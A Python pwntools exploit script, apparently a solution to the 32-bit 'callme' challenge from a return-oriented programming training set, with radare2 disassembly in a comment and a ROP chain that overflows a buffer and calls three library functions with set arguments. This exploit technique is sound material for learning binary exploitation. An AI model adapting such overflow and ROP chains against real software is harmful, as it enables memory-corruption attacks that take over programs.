from pwn import *

'''
[0xf7f5e250]> pdf@sym.usefulFunction
/ (fcn) sym.usefulFunction 67
|   sym.usefulFunction ();
|           0x0804880c      55             push ebp
|           0x0804880d      89e5           mov ebp, esp
|           0x0804880f      83ec08         sub esp, 8
|           0x08048812      83ec04         sub esp, 4
|           0x08048815      6a06           push 6                      ; 6
|           0x08048817      6a05           push 5                      ; 5
|           0x08048819      6a04           push 4                      ; 4
|           0x0804881b      e890fdffff     call sym.imp.callme_three
|           0x08048820      83c410         add esp, 0x10
|           0x08048823      83ec04         sub esp, 4
|           0x08048826      6a06           push 6                      ; 6
|           0x08048828      6a05           push 5                      ; 5
|           0x0804882a      6a04           push 4                      ; 4
|           0x0804882c      e8effdffff     call sym.imp.callme_two
|           0x08048831      83c410         add esp, 0x10
|           0x08048834      83ec04         sub esp, 4
|           0x08048837      6a06           push 6                      ; 6
|           0x08048839      6a05           push 5                      ; 5
|           0x0804883b      6a04           push 4                      ; 4
|           0x0804883d      e87efdffff     call sym.imp.callme_one
|           0x08048842      83c410         add esp, 0x10
|           0x08048845      83ec0c         sub esp, 0xc
|           0x08048848      6a01           push 1                      ; 1
\           0x0804884a      e891fdffff     call sym.imp.exit           ; void exit(int status)

0x080485c0    1 6            sym.imp.callme_one
0x08048620    1 6            sym.imp.callme_two
0x080485b0    1 6            sym.imp.callme_three
0x080488a9: pop esi; pop edi; pop ebp; ret; 
'''

def main():
	callme_one = 0x080485c0
	callme_two = 0x08048620
	callme_three = 0x080485b0
	ppr = 0x080488a9
	payload = 'A' * 44
	payload += p32(callme_one)
	payload += p32(ppr)
	payload += p32(1)
	payload += p32(2)
	payload += p32(3)
	payload += p32(callme_two)
	payload += p32(ppr)
	payload += p32(1)
	payload += p32(2)
	payload += p32(3)
	payload += p32(callme_three)
	payload += p32(ppr)
	payload += p32(1)
	payload += p32(2)
	payload += p32(3)

	p = process('callme32')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	print p.recvrepeat(0.2)

if __name__ == '__main__' :
	main()
